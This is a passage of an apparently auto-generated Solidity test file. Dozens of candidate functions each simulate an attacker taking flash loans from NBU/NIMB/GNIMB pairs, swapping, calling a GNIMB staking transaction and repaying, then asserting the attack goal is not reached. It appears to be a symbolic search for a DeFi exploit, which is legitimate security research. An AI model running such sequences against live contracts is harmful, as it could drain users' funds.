        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4431(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4432(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4433(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4434(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4435(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4436(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4437(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4438(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4439(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4440(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4441(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4442(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4443(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4444(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4445(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4446(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4447(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4448(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4449(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4450(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4451(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4452(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4453(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4454(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4455(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4456(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4457(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4458(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4459(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4460(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4461(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4462(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4463(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4464(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4465(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4466(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4467(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4468(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4469(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4470(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4471(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4472(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4473(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4474(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
